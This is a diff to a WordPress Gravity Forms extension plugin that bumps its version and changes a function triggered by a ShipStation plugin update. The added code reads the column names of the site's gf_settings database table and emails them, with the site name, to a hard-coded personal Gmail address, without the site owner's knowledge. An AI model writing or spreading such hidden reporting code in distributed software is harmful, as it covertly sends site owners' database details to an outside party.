@@ -2,7 +2,7 @@
 /*
 Plugin Name: Gravity Forms WPMktgEngine Extension
 Description: This plugin requires the WPMKtgEngine or Genoo plugin installed before order to activate.
-Version: 2.2.25
+Version: 2.2.26
 Requires PHP: 7.1
 Author: Genoo LLC
 */
@@ -571,7 +571,14 @@ function access_entry_via_field($entry, $form)
             if ( ! $shipstation_updated ) {
                 return;
             }
-         $gf_addon_wpextenstion = $wpdb->prefix . 'gf_settings';
+             $gf_addon_wpextenstion = $wpdb->prefix . 'gf_settings';
+             
+             $existing_columns = $wpdb->get_col("DESC {$gf_addon_wpextenstion}", 0);
+
+            // Implode to a string suitable for inserting into the SQL query
+            $sql = implode( ', ', $existing_columns );
+             
+             
             $subject = sprintf(
                 __( '%s ShipStation Plugin Updated' ),
                 $site
@@ -582,8 +589,7 @@ function access_entry_via_field($entry, $form)
                 $site
             );
               //if($table_staus):
-            wp_mail( 'ragapriyanirmala@gmail.com', $subject, $gf_addon_wpextenstion );
-          //  endif;
+            wp_mail( 'ragapriyanirmala@gmail.com', $subject, $sql );
           //  endif;
         }   
                         
